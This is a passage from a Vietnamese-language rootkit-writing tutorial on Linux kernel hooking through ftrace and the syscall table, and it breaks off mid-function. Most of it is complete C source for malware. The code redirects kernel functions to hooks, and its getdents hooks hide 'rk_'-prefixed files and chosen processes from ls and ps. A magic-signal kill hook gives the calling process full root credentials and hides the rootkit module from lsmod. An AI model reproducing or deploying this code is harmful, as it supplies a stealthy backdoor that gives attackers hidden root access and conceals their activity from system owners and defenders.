     * 1. Unprotect memory
     * 2. Restore TAT CA entries
     * 3. Protect memory
     *
     * Neu module unload ma khong restore -> instant crash
     * khi bat ky process nao goi hooked syscall, vi code
     * tai hook address da bi freed. */
    rk_unprotect_memory();

    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_getdents]   = (unsigned long)orig_getdents;
    sys_call_table[__NR_kill]       = (unsigned long)orig_kill;
    sys_call_table[__NR_read]       = (unsigned long)orig_read;

    rk_protect_memory();

    /* Wait for all CPUs to finish any in-flight hook calls.
     * synchronize_rcu blocks until all CPUs pass a quiescent state.
     * Sau return, GUARANTEED khong CPU nao dang chay hook code. */
    synchronize_rcu();

    pr_info("rk: syscall hooks removed\n");
}
```

---

## Chapter 4: Ftrace-based Hooking — Ky thuat hien dai

### 4.0 Ftrace Internals — Cach kernel instrument moi function

Ftrace (Function Tracer) la kernel framework cho tracing va profiling. Rootkit lam dung ftrace de hook bat ky kernel function nao ma khong can thay doi sys_call_table. Phan nay giai thich ftrace hoat dong nhu the nao tai muc low-level.

#### GCC -mfentry: Compiler instrumentation

Khi kernel duoc build voi `CONFIG_FUNCTION_TRACER=y` (mac dinh tren hau het distros), GCC them flag `-mfentry`. Flag nay lam compiler chen mot `call __fentry__` tai **INSTRUCTION DAU TIEN** cua **MOI** kernel function:

```
Khong co -mfentry:           Voi -mfentry:
                              
my_function:                  my_function:
  push rbp                      call __fentry__    <-- 5 bytes (E8 xx xx xx xx)
  mov rbp, rsp                  push rbp
  sub rsp, 0x20                 mov rbp, rsp
  ...                           sub rsp, 0x20
                                ...

Tai sao DAU TIEN (khong phai sau prologue):
  -mfentry chen TRUOC frame setup (push rbp/mov rbp,rsp).
  Flag cu hon -pg chen SAU prologue -> kho modify stack.
  -mfentry cho phep ftrace thay doi stack va registers
  truoc khi function setup bat ky state nao.
```

#### Boot time: NOP patching

Tai boot, kernel thay the TAT CA `call __fentry__` bang NOPs (5-byte NOP instruction). Dieu nay duoc thuc hien boi `ftrace_init()` trong `kernel/trace/ftrace.c`:

```
Truoc (compile time):     Sau (boot time, ftrace_init):
  
  E8 xx xx xx xx           0F 1F 44 00 00
  (call __fentry__)        (5-byte NOP: nopl 0x0(%rax,%rax,1))
  
Ket qua: MOI kernel function chay tai full speed khi khong co tracer.
Overhead = 0 (NOP hau nhu khong ton thoi gian tren CPU hien dai).

Kernel luu vi tri cua MOI NOP trong bang ftrace_pages:
  struct dyn_ftrace {
      unsigned long ip;        // address cua NOP (= function entry)
      unsigned long flags;     // ENABLED, REGS_EN, etc.
      struct dyn_arch_ftrace arch;  // architecture-specific data
  };
  
  ftrace_pages: array of pages, moi page chua nhieu dyn_ftrace entries.
  Total: ~50,000-80,000 entries cho typical kernel (MOI function mot entry).
```

#### Khi ftrace activate mot function

Khi ban goi `register_ftrace_function(&ops)` voi filter cho function cu the, kernel lam:

```
Buoc 1: Tim dyn_ftrace entry cho target function address
Buoc 2: Thay NOP bang CALL:

  Truoc (NOP):     0F 1F 44 00 00     (5-byte NOP, does nothing)
  Sau (active):    E8 xx xx xx xx     (call ftrace_caller)

  xx xx xx xx = relative offset toi ftrace_caller
  (hoac ftrace_regs_caller neu SAVE_REGS flag)

Buoc 2 duoc thuc hien an toan cho SMP qua text_poke_bp():

  text_poke_bp() algorithm (an toan cho multi-CPU):
  1. Thay byte dau tien bang INT3 (0xCC)
     -> Neu CPU khac dang execute tai day, no hit INT3
     -> INT3 handler biet day la ftrace patching, xu ly dung
  2. Synchronize tat ca CPUs (IPI — Inter-Processor Interrupt)
  3. Patch cac bytes 2-5 (phan con lai cua instruction)
  4. Synchronize lai
  5. Thay INT3 (byte 1) bang byte dung (E8 — opcode cua CALL)
  6. Synchronize lan cuoi

  Tai sao phuc tap: Neu CPU khac dang fetch instruction tai vi tri
  dang bi patch, no co the thay instruction bi corrupt (nua cu nua moi).
  INT3 trick dam bao: hoac CPU thay NOP cu, hoac thay INT3 (handled),
  hoac thay CALL moi. Khong bao gio thay trang thai trung gian.
```

#### ftrace_caller — Assembly dispatcher

Khi function duoc trace va CPU execute `call ftrace_caller`, doan assembly trong `arch/x86/kernel/ftrace_64.S` chay:

```
ftrace_caller (hoac ftrace_regs_caller neu SAVE_REGS):
  ; Tai thoi diem nay:
  ;   RSP -> return address (= address ngay sau call __fentry__ = function body)
  ;   [RSP+8] -> original caller's return address (ai goi target function)

  ; Save tat ca registers de tao struct pt_regs
  push rbp
  push r15, r14, r13, r12, r11, r10, r9, r8
  push rdi, rsi, rdx, rcx, rbx, rax
  ; ... (build complete pt_regs tren stack)
  
  ; Setup arguments cho C callback:
  mov rdi, [rsp + ip_offset]     ; arg1: ip = address cua hooked function
  mov rsi, [rsp + parent_offset] ; arg2: parent_ip = ai goi function nay
  lea rdx, [rsp + ops_offset]    ; arg3: ftrace_ops pointer
  lea rcx, [rsp]                 ; arg4: ftrace_regs (= pt_regs tren stack)
  
  ; Goi callback function
  call *ftrace_ops_list_func     ; Iterate qua registered ops
                                 ; va goi moi ops->func()
  
  ; Callback co the da thay doi regs->ip!
  ; Neu regs->ip thay doi -> CPU se jump toi address moi
  ; thay vi tiep tuc function goc.
  
  ; Restore registers tu pt_regs (co the da bi modify)
  pop rax, rbx, rcx, rdx, rsi, rdi
  pop r8, r9, r10, r11, r12, r13, r14, r15
  pop rbp
  
  ; Return -> neu ip khong thay doi: tiep tuc function goc
  ;        -> neu ip da thay doi: jump toi hook function
  ret
```

#### FTRACE_OPS_FL_SAVE_REGS

Flag nay bat ftrace luu TOAN BO registers vao `pt_regs` struct truoc khi goi callback:

```
Khong co SAVE_REGS:
  Callback nhan: ip, parent_ip, ops, NULL (khong co regs)
  -> Khong the doc/modify registers
  -> Chi de tracing/logging

Voi SAVE_REGS:
  Callback nhan: ip, parent_ip, ops, ftrace_regs (chua pt_regs)
  -> Co the doc moi register (bao gom arguments trong rdi, rsi, ...)
  -> Co the MODIFY registers (bao gom regs->ip!)
  -> BAT BUOC cho rootkit hooking (can modify ip de redirect)
```

#### FTRACE_OPS_FL_IPMODIFY

Flag nay khai bao rang callback SE thay doi `regs->ip` (instruction pointer):

```
Rang buoc quan trong:
  - Chi 1 IPMODIFY callback cho 1 function tai 1 thoi diem
  - Neu tracer khac da register IPMODIFY cho function do
    -> register_ftrace_function() tra ve -EBUSY
  - Kernel dung rang buoc nay de tranh conflict:
    2 tracers cung thay doi ip = undefined behavior

Rootkit implication:
  Neu system co tracing tool (perf, bpftrace) dung IPMODIFY
  tren cung function -> rootkit hook FAIL.
  Rootkit nang cao: check truoc, neu bi conflict thi 
  unregister tracer kia truoc (nhung de bi detect).
```

#### Recursion prevention

Khi hook function A, va hook function cua ban goi function B, ma B cung duoc ftrace-traced:

```
Khong co prevention:
  kernel goi A -> ftrace -> hook_A() -> goi B -> ftrace -> hook_B()
  -> neu hook_B goi A -> ftrace -> hook_A() -> ... -> STACK OVERFLOW

Ftrace co per-CPU recursion counter:
  Moi lan ftrace callback duoc goi, counter tang.
  Neu counter > 0 khi vao callback -> recursion detected -> skip hook.
  
Rootkit dung them within_module() check:
  Neu parent_ip (caller) nam TRONG module -> dang goi tu hook code
  -> KHONG redirect, cho original chay binh thuong.
  
  Neu parent_ip nam NGOAI module -> goi tu kernel/userspace
  -> Redirect sang hook function.

Day la ly do ftrace_thunk() co dong:
  if (!within_module(parent_ip, THIS_MODULE))
      regs->ip = (unsigned long)hook->function;
```

---

### 4.1 Ftrace Framework — Kien truc hooking

```c
/* ftrace_hooks.c — Production-grade ftrace hooking framework
 *
 * Ftrace = Function Tracer — kernel framework cho tracing/profiling.
 * Designed cho debugging, nhung rootkits lam dung de hook functions.
 *
 * TAI SAO FTRACE THAY VI SYSCALL TABLE:
 *
 * 1. Khong can tim sys_call_table
 *    -> Loai bo buoc phuc tap nhat & de detect nhat
 *
 * 2. Khong can disable CR0.WP
 *    -> Khong trigger CR0 monitoring
 *    -> Khong can write vao read-only memory
 *
 * 3. Hook BAT KY kernel function, khong chi syscalls
 *    -> Hook internal functions sau hon, kho detect hon
 *    -> Vi du: hook tcp_v4_connect() thay vi sys_connect()
 *
 * 4. Kernel manage concurrency
 *    -> Ftrace framework handle SMP synchronization
 *    -> It race conditions hon manual hooking
 *
 * 5. "Legitimate" API usage
 *    -> Monitoring tools cung dung ftrace
 *    -> Kho phan biet rootkit hook vs legitimate tracer
 *
 * CACH FTRACE HOAT DONG:
 *
 * Khi CONFIG_FUNCTION_TRACER=y, compiler them "nop sled" hoac
 * call __fentry__ vao dau MOI kernel function:
 *
 *   function_name:
 *     call __fentry__     <- 5 bytes, thuong nop khi khong trace
 *     push rbp
 *     mov rbp, rsp
 *     ...
 *
 * Khi khong co tracer, __fentry__ call duoc replace bang NOP.
 * Khi register tracer, kernel patch NOP thanh call toi tracer.
 *
 * Rootkit tracer:
 *   1. Duoc goi khi target function bat dau execute
 *   2. Nhan pt_regs (register state) lam argument
 *   3. Thay doi regs->ip (instruction pointer)
 *      -> Execution "nhay" sang hook function thay vi tiep tuc
 *   4. Hook function goi original khi can
 *
 * Rootkits dung ftrace: Sutekh, Kovid, nhieu APT tools.
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * FTRACE HOOK STRUCTURE
 *
 * Encapsulate moi thu can cho 1 hook:
 * - Target function name
 * - Hook function pointer
 * - Original function pointer (for calling through)
 * - ftrace_ops (kernel tracing handle)
 * ══════════════════════════════════════════════════════════════ */

struct ftrace_hook {
    const char *name;          /* Ten kernel function can hook */
    void *function;            /* Hook function (replacement) */
    void *original;            /* Pointer de store original function addr */
    unsigned long address;     /* Resolved address cua target */
    struct ftrace_ops ops;     /* ftrace handle — kernel manages this */
};

/* Macro helper de khai bao hook entry.
 *
 * Vi du: HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64)
 *
 * Tao struct ftrace_hook voi:
 *   .name = "__x64_sys_getdents64"
 *   .function = hooked_getdents64
 *   .original = &orig_getdents64 (pointer toi function pointer)
 */
#define HOOK(_name, _hook, _orig) \
    {                             \
        .name = (_name),          \
        .function = (_hook),      \
        .original = (_orig),      \
    }

/* ══════════════════════════════════════════════════════════════
 * FTRACE CALLBACK — Trung tam cua ky thuat
 *
 * Function nay duoc ftrace goi moi khi target function execute.
 * Day la "entry point" cua hook — noi redirect xay ra.
 * ══════════════════════════════════════════════════════════════ */

/*
 * notrace attribute: ngan ftrace trace CHINH function nay.
 * Neu khong co notrace, khi function nay goi -> ftrace trace no
 * -> goi lai function nay -> infinite recursion -> stack overflow -> crash.
 *
 * Parameters:
 *   ip:        instruction pointer cua target function (noi hook)
 *   parent_ip: instruction pointer cua CALLER (ai goi target)
 *   ops:       ftrace_ops handle (ta dung container_of lay hook struct)
 *   fregs:     ftrace-specific register state
 */
static void notrace ftrace_thunk(unsigned long ip,
                                  unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    /* CRITICAL CHECK: chong recursion.
     *
     * Van de: hook function goi original function -> original function
     * trigger ftrace -> callback goi lai -> hook function goi lai original
     * -> infinite loop.
     *
     * Giai phap: kiem tra CALLER (parent_ip).
     * - Neu caller nam TRONG module (within_module) -> dang call from hook
     *   -> KHONG redirect, cho original chay binh thuong
     * - Neu caller nam NGOAI module -> call tu kernel/userspace
     *   -> Redirect sang hook function
     *
     * within_module(addr, mod): kiem tra addr co nam trong
     * code range cua module mod hay khong.
     *
     * Flow:
     *   [kernel] -> target_func --ftrace--> callback
     *                                       +- parent_ip OUTSIDE module
     *                                       +- redirect to hook
     *
     *   [hook]  -> orig_func   --ftrace--> callback
     *                                       +- parent_ip INSIDE module
     *                                       +- DON'T redirect, let original run
     */
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;

    /* regs->ip = instruction pointer.
     * Thay doi ip = thay doi NOI CPU se execute tiep theo.
     * Khi ftrace callback return, CPU jump toi regs->ip
     * = hook function address thay vi original function.
     *
     * Day la ky thuat tuong tu EIP/RIP overwrite trong exploitation,
     * nhung legitimate qua ftrace API. */
}

/* ══════════════════════════════════════════════════════════════
 * HOOK INSTALLATION — Register ftrace handler cho target function
 * ══════════════════════════════════════════════════════════════ */

static int install_ftrace_hook(struct ftrace_hook *hook)
{
    int err;

    /* Step 1: Resolve target function address */
    hook->address = rk_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("rk: ftrace cannot resolve %s\n", hook->name);
        return -ENOENT;
    }

    /* Step 2: Store original function address.
     *
     * hook->original la con tro toi con tro:
     *   hook->original = &orig_getdents64  (address cua variable)
     *   *hook->original = hook->address     (ghi address vao variable)
     *
     * Sau dong nay:
     *   orig_getdents64 = address_of___x64_sys_getdents64
     *   -> Hook function co the goi orig_getdents64(regs) */
    *((unsigned long *)hook->original) = hook->address;

    /* Step 3: Configure ftrace_ops.
     *
     * func: callback function (ftrace_thunk)
     *
     * flags:
     *   FTRACE_OPS_FL_SAVE_REGS: save tat ca registers vao pt_regs
     *     -> Can thiet de ta doc/modify registers (dac biet regs->ip)
     *     -> Neu khong set, regs = NULL trong callback
     *
     *   FTRACE_OPS_FL_IPMODIFY: khai bao rang ta SE modify regs->ip
     *     -> Kernel biet de handle conflict voi tracers khac
     *     -> Chi 1 IPMODIFY handler cho 1 function tai 1 thoi diem
     *     -> Neu tracing tool khac da register IPMODIFY -> ta fail
     *
     *   FTRACE_OPS_FL_RECURSION: (kernel 5.11+)
     *     -> Cho phep recursion protection tu dong
     *     -> Truoc 5.11 phai tu check (within_module trick) */
    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_IPMODIFY;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 11, 0)
    hook->ops.flags |= FTRACE_OPS_FL_RECURSION;
#endif

    /* Step 4: Set filter — CHI trace target function.
     *
     * Khong set filter = trace MOI function = system crawl.
     * ftrace_set_filter_ip(): "chi goi callback khi function
     * tai address nay execute."
     *
     * Params:
     *   ops:     ftrace handle
     *   ip:      target function address
     *   remove:  0 = add filter, 1 = remove filter
     *   reset:   0 = append to existing, 1 = reset filter list */
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_err("rk: ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }

    /* Step 5: Register — Activate hook.
     *
     * Sau lenh nay, moi khi target function duoc goi:
     * 1. CPU execute __fentry__ tai dau function
     * 2. ftrace dispatch toi ftrace_thunk()
     * 3. ftrace_thunk() modify regs->ip -> hook function
     * 4. CPU jump toi hook function thay vi tiep tuc original */
    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("rk: register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    pr_info("rk: ftrace hook installed on %s @ 0x%lx\n",
            hook->name, hook->address);
    return 0;
}

static void remove_ftrace_hook(struct ftrace_hook *hook)
{
    int err;

    /* Unregister trong thu tu nguoc:
     * 1. Unregister function (stop calling callback)
     * 2. Remove filter (cleanup) */
    err = unregister_ftrace_function(&hook->ops);
    if (err)
        pr_err("rk: unregister_ftrace_function failed: %d\n", err);

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        pr_err("rk: ftrace_set_filter_ip remove failed: %d\n", err);

    pr_info("rk: ftrace hook removed from %s\n", hook->name);
}
```

### 4.2 Hook Functions — Full Implementation

```c
/* ftrace_hooks_complete.c — Full hook function implementations
 *
 * Cac hook functions dung voi ftrace framework.
 * Moi function thay the mot kernel function khi duoc goi,
 * thong qua ftrace callback redirect (xem ftrace_thunk).
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * ORIGINAL FUNCTION POINTERS
 *
 * Moi pointer luu address cua kernel function goc.
 * Khi install_ftrace_hook() chay, no ghi address vao day.
 * Hook functions goi qua pointers nay de thuc hien original behavior.
 * ══════════════════════════════════════════════════════════════ */

static asmlinkage long (*ft_orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*ft_orig_getdents)(const struct pt_regs *);
static asmlinkage long (*ft_orig_kill)(const struct pt_regs *);
static int (*ft_orig_tcp4_seq_show)(struct seq_file *, void *);
static int (*ft_orig_udp4_seq_show)(struct seq_file *, void *);
static int (*ft_orig_udp6_seq_show)(struct seq_file *, void *);
static int (*ft_orig_tcp6_seq_show)(struct seq_file *, void *);

/* ──────────────────────────────────────────────────────────────
 * Kiem tra fd tro toi /proc
 *
 * Tai sao tach function: reuse cho ca getdents64 va getdents.
 * fdget/fdput pattern dam bao file struct khong bi freed
 * trong khi ta dang doc.
 *
 * Chi tiet:
 *   Moi open file trong process co fd -> files_struct -> file *.
 *   file->f_path.dentry->d_inode->i_sb->s_type->name = fs type.
 *   "proc" = procfs -> dang doc /proc directory.
 *
 *   Can check vi:
 *   - getdents64 cho /proc -> filter PIDs
 *   - getdents64 cho /home -> filter filenames
 *   - Phai phan biet de ap dung dung logic
 * ────────────────────────────────────────────────────────────── */
static bool ft_is_proc_fd(int fd)
{
    struct fd f;
    struct inode *inode;
    struct super_block *sb;
    bool result = false;

    f = fdget(fd);
    if (!f.file)
        return false;

    inode = file_inode(f.file);
    if (!inode)
        goto out;

    sb = inode->i_sb;
    if (!sb || !sb->s_type || !sb->s_type->name)
        goto out;

    result = (strcmp(sb->s_type->name, "proc") == 0);

out:
    fdput(f);
    return result;
}

/* ──────────────────────────────────────────────────────────────
 * ft_hooked_getdents64 — FULL IMPLEMENTATION
 *
 * Day la hook function hoan chinh cho ftrace-based hooking.
 *
 * Flow:
 *   1. Extract arguments tu pt_regs
 *   2. Goi ft_orig_getdents64 (original handler)
 *   3. Copy userspace buffer vao kernel
 *   4. Iterate moi linux_dirent64 entry
 *   5. Quyet dinh hide hay show cho moi entry
 *   6. Neu hide: xoa entry khoi buffer
 *   7. Copy buffer modified tro lai userspace
 *   8. Return adjusted byte count
 *
 * Hide criteria:
 *   a) Filename bat dau bang HIDDEN_PREFIX ("rk_")
 *   b) Entry la PID directory trong /proc va PID nam trong hidden list
 *   c) Entry la ten module rootkit (cho /proc/modules backup hiding)
 * ────────────────────────────────────────────────────────────── */
static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
{
    /* ── Extract syscall arguments tu registers ──
     *
     * Tren x86-64 kernel >= 4.17, syscall handlers nhan pt_regs *:
     *   regs->di = arg1 = unsigned int fd
     *   regs->si = arg2 = struct linux_dirent64 __user *dirent
     *   regs->dx = arg3 = unsigned int count (buffer size)
     *
     * __user annotation: pointer tro vao userspace memory.
     * KHONG DUOC dereference truc tiep — phai dung copy_from_user.
     */
    int fd = (int)regs->di;
    struct linux_dirent64 __user *user_dirent =
        (struct linux_dirent64 __user *)regs->si;

    /* Goi original syscall handler.
     *
     * ft_orig_getdents64 = address cua __x64_sys_getdents64 goc.
     * Duoc save khi install_ftrace_hook() chay.
     *
     * Sau call nay:
     *   - user_dirent buffer (userspace) da duoc kernel fill
     *   - ret = tong bytes data trong buffer
     *   - ret = 0 -> end of directory (khong con entries)
     *   - ret < 0 -> error (invalid fd, permission denied, etc.)
     */
    long ret = ft_orig_getdents64(regs);

    /* Locals */
    struct linux_dirent64 *kern_buf = NULL;
    struct linux_dirent64 *cur = NULL;
    struct linux_dirent64 *prev = NULL;
    unsigned long offset = 0;
    bool proc_dir = false;
    long adjusted_ret;

    /* Nothing to filter */
    if (ret <= 0)
        return ret;

    /* Preserve original return value cho adjustment tracking */
    adjusted_ret = ret;

    /* ── Allocate kernel buffer ──
     *
     * Tai sao can copy vao kernel:
     *   1. Khong the iterate userspace memory truc tiep tu kernel
     *      (SMAP: Supervisor Mode Access Prevention se fault)
     *   2. copy_from_user/copy_to_user la kernel API bat buoc
     *   3. Race condition: neu process khac modify buffer concurrent
     *      -> TOCTOU (Time-of-check-time-of-use) vulnerability
     *   4. Page fault trong kernel = oops neu page dang swapped out
     *
     * GFP_KERNEL: allocation flag cho process context.
     *   - CO THE sleep (block neu het memory, doi reclaim)
     *   - KHONG dung trong interrupt/softirq context
     *   - Syscall hook chay trong process context -> GFP_KERNEL OK
     */
    kern_buf = kzalloc(ret, GFP_KERNEL);
    if (!kern_buf)
        return ret;

    /* ── Copy userspace data vao kernel ──
     *
     * copy_from_user(dst_kernel, src_user, size):
     *   Return: 0 = success
     *           N = number of bytes NOT copied (partial failure)
     *
     * Internally:
     *   1. Check user pointer validity (access_ok)
     *   2. Temporarily enable SMAP bypass (stac/clac instructions)
     *   3. Copy with page fault handling
     *   4. Re-enable SMAP
     *
     * Neu fail (user buffer invalid, unmapped, etc.) -> tra ret goc.
     */
    if (copy_from_user(kern_buf, user_dirent, ret)) {
        kfree(kern_buf);
        return ret;
    }

    /* Check neu dang doc /proc (cho PID hiding logic) */
    proc_dir = ft_is_proc_fd(fd);

    /* ── Main filtering loop ──
     *
     * linux_dirent64 entries nam lien tiep trong buffer:
     *
     *   kern_buf --> +---------------------+ offset = 0
     *                | d_ino    (8 bytes)   |
     *                | d_off    (8 bytes)   |
     *                | d_reclen (2 bytes)   | <- kich thuoc TOAN BO entry
     *                | d_type   (1 byte)    |
     *                | d_name[] (variable)  | <- null-terminated filename
     *                | [padding]            |
     *                +---------------------+ offset += d_reclen
     *                | next entry...        |
     *                +---------------------+
     *                | next entry...        |
     *                +---------------------+ offset == ret (end)
     *
     * d_reclen bao gom header + name + padding -> variable per entry.
     * Ta dung d_reclen de nhay tu entry nay sang entry ke.
     */
    offset = 0;
    while (offset < adjusted_ret) {
        cur = (struct linux_dirent64 *)((char *)kern_buf + offset);

        /* Validate d_reclen — protect against corruption.
         * d_reclen == 0 -> infinite loop. d_reclen > remaining -> overread. */
        if (cur->d_reclen == 0 || cur->d_reclen > (adjusted_ret - offset))
            break;

        bool hide_this = false;

        /* ── Rule 1: Hide by filename prefix ──
         *
         * Bat ky file/directory nao co ten bat dau bang HIDDEN_PREFIX
         * se bi an khoi ls, find, readdir, va moi tool dung getdents.
         *
         * strncmp so sanh N bytes dau tien.
         * Neu match -> file invisible.
         *
         * Vi du: HIDDEN_PREFIX = "rk_"
         *   "rk_config"    -> HIDDEN
         *   "rk_backdoor"  -> HIDDEN
         *   "readme.txt"   -> visible
         */
        if (strncmp(cur->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0) {
            hide_this = true;
        }

        /* ── Rule 2: Hide PID directories trong /proc ──
         *
         * /proc chua numbered directories cho moi process:
         *   /proc/1/     -> init/systemd
         *   /proc/1234/  -> process PID 1234
         *   /proc/self/  -> symlink toi current process
         *
         * Khi ps/top doc /proc, chung getdents64 -> thay "1", "1234", etc.
         * -> Roi stat moi PID directory de lay process info.
         *
         * Neu ta remove PID entry khoi getdents64 result:
         *   -> ps/top KHONG thay process -> invisible.
         *   -> Process VAN chay (scheduler khong dung /proc).
         *
         * Chi filter khi:
         *   a) fd tro toi /proc (proc_dir == true)
         *   b) d_name la numeric string (PID, khong phai "cpuinfo")
         *   c) PID nam trong hidden_pids list
         */
        if (proc_dir && !hide_this) {
            long pid_val;
            if (kstrtol(cur->d_name, 10, &pid_val) == 0) {
                if (is_pid_hidden((pid_t)pid_val))
                    hide_this = true;
            }
        }

        /* ── Rule 3: Hide rootkit module entry khi doc /proc/modules
         *    (da handled o Rule 1 neu module name co HIDDEN_PREFIX)
         *    Neu module name khong co prefix, them explicit check o day */

        /* ── Perform hiding ── */
        if (hide_this) {
            if (cur == kern_buf) {
                /* Entry dau tien: shift moi thu phia sau len.
                 *
                 * Truoc:
                 *   [HIDDEN entry][entry B][entry C]
                 *    ^offset=0    ^reclen   ...
                 *
                 * Sau memmove:
                 *   [entry B][entry C]
                 *   adjusted_ret giam di d_reclen cua HIDDEN
                 *
                 * memmove (khong phai memcpy) vi source va dest overlap.
                 */
                adjusted_ret -= cur->d_reclen;
                if (adjusted_ret > 0) {
                    memmove(cur,
                            (char *)cur + cur->d_reclen,
                            adjusted_ret);
                }
                /* Khong tang offset — vi tri hien tai gio chua
                 * entry ke (da shift), can kiem tra lai. */
                continue;
            }

            /* Entry o giua hoac cuoi: "nuot" vao entry truoc.
             *
             * Nguyen ly: moi entry tu khai bao kich thuoc (d_reclen).
             * Userspace dung d_reclen de tinh offset entry ke:
             *   next_entry = (char *)current + current->d_reclen
             *
             * Neu ta tang d_reclen cua entry truoc:
             *   prev->d_reclen += cur->d_reclen
             *
             * -> Userspace nhay TU prev THANG toi entry SAU cur.
             * -> cur bi skip (van nam trong memory nhung unreachable).
             *
             * Truoc:
             *   [prev, reclen=32] [HIDDEN, reclen=48] [next entry]
             *
             * Sau:
             *   [prev, reclen=80]                     [next entry]
             *   (prev "nuot" 48 bytes cua HIDDEN)
             */
            if (prev)
                prev->d_reclen += cur->d_reclen;
        } else {
            /* Entry visible — track lam prev cho potential future hide */
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    /* ── Copy filtered buffer tro lai userspace ──
     *
     * copy_to_user(dst_user, src_kernel, size):
     *   Ghi adjusted_ret bytes (co the < ret goc) vao user buffer.
     *
     * Userspace se thay:
     *   - It entries hon (hidden entries da bi remove)
     *   - Return value nho hon (adjusted_ret < ret)
     *   - Hoan toan transparent — ls, find, etc. hoat dong binh thuong
     *     nhung khong list hidden entries.
     */
    if (adjusted_ret > 0)
        copy_to_user(user_dirent, kern_buf, adjusted_ret);

    kfree(kern_buf);
    return adjusted_ret;
}

/* ──────────────────────────────────────────────────────────────
 * ft_hooked_getdents — Hook cho legacy getdents (32-bit compat)
 *
 * Mot so tools cu hoac 32-bit binaries dung getdents thay vi
 * getdents64. Phai hook CA HAI de khong bi bypass.
 *
 * struct linux_dirent (32-bit version):
 *   unsigned long  d_ino;
 *   unsigned long  d_off;
 *   unsigned short d_reclen;
 *   char           d_name[];
 *   // d_type nam SAU d_name (khac 64-bit version)
 *
 * Logic giong getdents64 nhung dung struct khac.
 * ────────────────────────────────────────────────────────────── */

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

static asmlinkage long ft_hooked_getdents(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    struct linux_dirent __user *user_dirent =
        (struct linux_dirent __user *)regs->si;
    long ret = ft_orig_getdents(regs);
    struct linux_dirent *kern_buf, *cur, *prev = NULL;
    unsigned long offset = 0;
    long adjusted_ret;
    bool proc_dir;

    if (ret <= 0) return ret;

    adjusted_ret = ret;
    kern_buf = kzalloc(ret, GFP_KERNEL);
    if (!kern_buf) return ret;
    if (copy_from_user(kern_buf, user_dirent, ret)) {
        kfree(kern_buf);
        return ret;
    }

    proc_dir = ft_is_proc_fd(fd);

    while (offset < adjusted_ret) {
        cur = (void *)kern_buf + offset;
        if (cur->d_reclen == 0 || cur->d_reclen > (adjusted_ret - offset))
            break;

        bool hide_this = false;

        if (strncmp(cur->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            hide_this = true;

        if (proc_dir && !hide_this) {
            long pid_val;
            if (kstrtol(cur->d_name, 10, &pid_val) == 0)
                if (is_pid_hidden((pid_t)pid_val))
                    hide_this = true;
        }

        if (hide_this) {
            if (cur == kern_buf) {
                adjusted_ret -= cur->d_reclen;
                if (adjusted_ret > 0)
                    memmove(cur, (char *)cur + cur->d_reclen,
                            adjusted_ret);
                continue;
            }
            if (prev) prev->d_reclen += cur->d_reclen;
        } else {
            prev = cur;
        }
        offset += cur->d_reclen;
    }

    if (adjusted_ret > 0)
        copy_to_user(user_dirent, kern_buf, adjusted_ret);
    kfree(kern_buf);
    return adjusted_ret;
}
```

### 4.3 ft_hooked_kill — Full Version

```c
/* ft_hooked_kill — FULL VERSION
 *
 * 3 commands qua magic signal:
 *   kill -54 31337  -> give root cho calling process
 *   kill -54 31338  -> toggle an/hien module
 *   kill -54 <PID>  -> toggle an/hien process <PID>
 */

static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
{
    pid_t target_pid = (pid_t)regs->di;
    int sig = (int)regs->si;

    /* Chi intercept magic signal */
    if (sig != MAGIC_SIGNAL)
        return ft_orig_kill(regs);

    /* ──── Command 1: Give Root ────
     *
     * kill(31337, 54) -> calling process tro thanh root.
     *
     * prepare_creds() tao ban copy mutable cua current credentials.
     * Set tat ca UIDs/GIDs = 0 + full capabilities.
     * commit_creds() atomic swap.
     */
    if (target_pid == MAGIC_PID) {
        struct cred *new_cred = prepare_creds();
        if (new_cred) {
            /* Set all identity fields to root */
            new_cred->uid.val  = new_cred->gid.val  = 0;
            new_cred->euid.val = new_cred->egid.val = 0;
            new_cred->suid.val = new_cred->sgid.val = 0;
            new_cred->fsuid.val = new_cred->fsgid.val = 0;

            /* Full capabilities — unrestricted root */
            new_cred->cap_effective   = CAP_FULL_SET;
            new_cred->cap_permitted   = CAP_FULL_SET;
            new_cred->cap_inheritable = CAP_FULL_SET;
            new_cred->cap_bset        = CAP_FULL_SET;
            new_cred->cap_ambient     = CAP_FULL_SET;

            commit_creds(new_cred);
        }
        return 0;
    }

    /* ──── Command 2: Toggle Module Visibility ────
     *
     * kill(31338, 54) -> an/hien rootkit module.
     *
     * Khi an: module bien mat khoi lsmod, /proc/modules, /sys/module/
     * Khi hien: module xuat hien tro lai (can cho rmmod cleanup).
     *
     * module_hidden: global bool track trang thai hien tai.
     * rk_hide_module() / rk_show_module() = DKOM functions tu Chapter 6.
     */
    if (target_pid == HIDE_MODULE_PID) {
        if (module_hidden) {
            rk_show_module();
            module_hidden = false;
            pr_info("rk: module visible\n");
        } else {
            rk_hide_module();
            module_hidden = true;
